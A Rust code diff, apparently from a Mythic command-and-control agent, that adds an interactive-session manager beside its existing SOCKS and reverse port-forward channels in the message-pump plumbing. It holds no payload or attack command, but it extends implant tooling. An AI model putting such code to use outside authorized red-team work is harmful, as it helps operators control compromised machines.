@@ -11,6 +11,7 @@ use serde::Deserialize;
 use crate::DEBUG;
 use crate::auxiliary::AuxiliaryManager;
 use crate::dispatch;
+use crate::interactive::InteractiveManager;
 use crate::rpfwd::RpfwdManager;
 use crate::socks::SocksManager;
 use crate::streams::StreamDriver;
@@ -33,6 +34,7 @@ pub struct ProtocolPump {
     pending: Vec<TaskResponse>,
     socks: SocksManager,
     rpfwd: RpfwdManager,
+    interactive: InteractiveManager,
     auxiliary: AuxiliaryManager,
 }
 
@@ -42,6 +44,7 @@ impl ProtocolPump {
             pending: Vec::new(),
             socks: SocksManager::new(),
             rpfwd: RpfwdManager::new(),
+            interactive: InteractiveManager::new(),
             auxiliary: AuxiliaryManager::new(),
         }
     }
@@ -54,9 +57,14 @@ impl ProtocolPump {
         self.rpfwd.start_from_task(task)
     }
 
+    pub fn start_interactive(&mut self, task: &mythic::TaskMessage) -> TaskResponse {
+        self.interactive.start_from_task(task)
+    }
+
     pub fn wants_fast_poll(&self) -> bool {
         StreamDriver::wants_fast_poll(&self.socks)
             || StreamDriver::wants_fast_poll(&self.rpfwd)
+            || StreamDriver::wants_fast_poll(&self.interactive)
             || self.auxiliary.wants_fast_poll()
     }
 
@@ -68,6 +76,8 @@ impl ProtocolPump {
         let mut shared = AgentExtras::default();
         shared.socks = StreamDriver::drain_outbound(&mut self.socks);
         shared.rpfwd = StreamDriver::drain_outbound(&mut self.rpfwd);
+        shared.interactive = StreamDriver::drain_outbound(&mut self.interactive);
+        self.pending.extend(self.interactive.drain_responses());
         self.auxiliary.drain_into(&mut shared);
         shared
     }
@@ -76,11 +86,13 @@ impl ProtocolPump {
         self.auxiliary.handle_inbound(&extras);
         StreamDriver::handle_inbound(&mut self.socks, extras.socks);
         StreamDriver::handle_inbound(&mut self.rpfwd, extras.rpfwd);
+        StreamDriver::handle_inbound(&mut self.interactive, extras.interactive);
     }
 
     pub fn requeue_shared(&mut self, shared: AgentExtras) {
         StreamDriver::requeue_outbound_front(&mut self.socks, shared.socks);
         StreamDriver::requeue_outbound_front(&mut self.rpfwd, shared.rpfwd);
+        StreamDriver::requeue_outbound_front(&mut self.interactive, shared.interactive);
         self.auxiliary.requeue_alerts_front(shared.alerts);
     }
 
@@ -108,6 +120,7 @@ impl ProtocolPump {
         if self.pending.is_empty()
             && shared.socks.is_empty()
             && shared.rpfwd.is_empty()
+            && shared.interactive.is_empty()
             && shared.alerts.is_empty()
         {
             return Ok(());
